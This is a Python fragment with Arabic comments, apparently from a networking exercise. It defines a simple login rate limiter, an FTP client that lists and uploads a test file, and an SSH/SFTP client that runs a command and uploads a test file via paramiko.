# ── حماية من Brute Force ──
_attempts = {}
_lock = threading.Lock()

def rate_limit(ip, max_tries=5):
    """يمنع أكثر من 5 محاولات لوجين في الدقيقة"""
    with _lock:
        now = time.time()
        _attempts.setdefault(ip, [])
        _attempts[ip] = [t for t in _attempts[ip] if now - t < 60]
        _attempts[ip].append(now)
        if len(_attempts[ip]) > max_tries:
            print(f"  [!] Rate limit: {ip} محجوب مؤقتاً")
            return False
        return True

def ftp_connect(host, user="anonymous", password=""):
    """FTP: يتصل، يعرض الملفات، يرفع ملف تجريبي"""
    print(f"\n[FTP] Connecting to {host} ...")
    if not rate_limit(host):
        return
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        ftp.login(user, password)
        print(f"  [+] Login OK")

        # عرض الملفات
        print("  [*] Files:")
        ftp.retrlines("LIST")

        # رفع ملف تجريبي
        test_file = "ftp_test.txt"
        with open(test_file, "w") as f:
            f.write("Phase 2 FTP test - Abdallah Haboob")
        with open(test_file, "rb") as f:
            ftp.storbinary(f"STOR {test_file}", f)
        print(f"  [+] Uploaded: {test_file}")

        ftp.quit()
        os.remove(test_file)
    except Exception as e:
        print(f"  [!] FTP Error: {e}")

def ssh_connect(host, user, password=None, key_path=None, command="whoami"):
    """SSH: يتصل، ينفذ أمر، يرفع ملف عبر SFTP"""
    print(f"\n[SSH] Connecting to {host} as {user} ...")
    if not HAS_SSH:
        print("  [!] paramiko غير مثبت. شغّل: pip install paramiko")
        return
    if not rate_limit(host):
        return
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Key-based أو Password
        if key_path:
            key = paramiko.RSAKey.from_private_key_file(key_path)
            client.connect(host, username=user, pkey=key, timeout=10)
            print("  [+] Connected (key-based auth)")
        else:
            client.connect(host, username=user, password=password, timeout=10)
            print("  [+] Connected (password auth)")

        # تنفيذ أمر
        _, stdout, stderr = client.exec_command(command)
        print(f"  [CMD] {command}")
        print(f"  [OUT] {stdout.read().decode().strip()}")

        # SFTP: رفع ملف
        sftp = client.open_sftp()
        test_file = "sftp_test.txt"
        with open(test_file, "w") as f:
            f.write("Phase 2 SFTP test - Abdallah Haboob")
        sftp.put(test_file, f"/tmp/{test_file}")
        print(f"  [+] SFTP Upload OK → /tmp/{test_file}")
        sftp.close()
        os.remove(test_file)

        client.close()
    except Exception as e:
        print(f"  [!] SSH Error: {e}")

